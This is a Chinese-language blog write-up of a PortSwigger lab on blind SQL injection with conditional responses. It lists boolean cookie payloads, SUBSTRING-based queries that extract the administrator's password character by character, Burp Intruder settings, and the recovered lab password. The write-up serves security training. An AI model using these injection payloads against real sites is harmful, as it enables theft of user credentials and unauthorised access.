---
layout: post
title: "Blind SQL injection with conditional responses"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---





# Blind SQL injection with conditional responses


```

 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.
Hint

You can assume that the password only contains lowercase, alphanumeric characters.




本實驗包含一個盲 SQL 注入漏洞。 該應用程序使用跟踪 cookie 進行分析，並執行包含提交的 cookie 值的 SQL 查詢。

不返回 SQL 查詢的結果，也不顯示錯誤消息。 但如果查詢返回任何行，應用程序會在頁面中包含“歡迎回來”消息。

該數據庫包含一個名為 users 的不同表，其中包含名為 username 和 password 的列。 您需要利用 SQL 盲注漏洞找出管理員用戶的密碼。

要解決實驗室問題，請以管理員用戶身份登錄。
暗示

您可以假設密碼僅包含小寫字母數字字符。



```

先去研究DVWA CMD SQL操作練習那篇，再回來!!!



我們在一進入，首頁抓包，

```http
GET / HTTP/1.1
Host: 0ac200d80319ee68c05e79a300900081.web-security-academy.net
Cookie: TrackingId=0Ln4khYfs2N0Q94R; session=BOXO2Tw2Kn2AEmmyKLDwcvj0ee9N2qtc
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
Connection: close


```


進入多個頁面發現 TrackingId 都一樣，這很有可能就是使用者ID
```
TrackingId=0Ln4khYfs2N0Q94R
```

只不過通常會把他加密，不讓別人去猜到，而直接進入登入狀態。
```
TrackingId=123
```


回顯字樣:Welcome back!
```
' AND '1'='1

//效果一樣
' AND 1=1--

```


Welcome back!字樣不見了
```
' AND '1'='2
```


由於不會透過返回字串，所以只能用Welcome back! 來判斷語句有沒有被執行。



猜測 有無 users 表

```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```


猜測 users 表中 username 欄位 有沒有資料叫做 administrator
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```


猜測 users 表中   administrator用戶名的密碼長度。
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```



intruder Options:
Grep-Match 打勾
清空list
add Welcome back!

這些拿去BP 給它跑，最後>19 所以密碼長度20
```
TrackingId=0Ln4khYfs2N0Q94R' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a
```


接下來 要用 SUBSTRING() 去判斷字元

``` 
//從ABC字串的 第一個字元開始 取一個。
SUBSTRING(ABC,1,1) 
// echo A

SUBSTRING(ABC,2,1) 
// echo B

SUBSTRING(ABC,3,1) 
// echo C
```


用intruder cluster bomb
payload1: 1-20

payload1: 0-9 a-z A-Z
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

//xxxx 跑1-20
SUBSTRING(password,xxxx,1) 

//xxxx 跑 0-9 a-z A-Z
(SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='xxxx


```

跑出來
```
sn71nbnzsx8sn1swc6ts
```



其實這題，已經算簡單的，它還有跳過很多步驟，直接跳去猜users 表，administrator 。

而且一般密碼都加密到32位元。

只不過良心建議使用PRO 跑得快 !!!


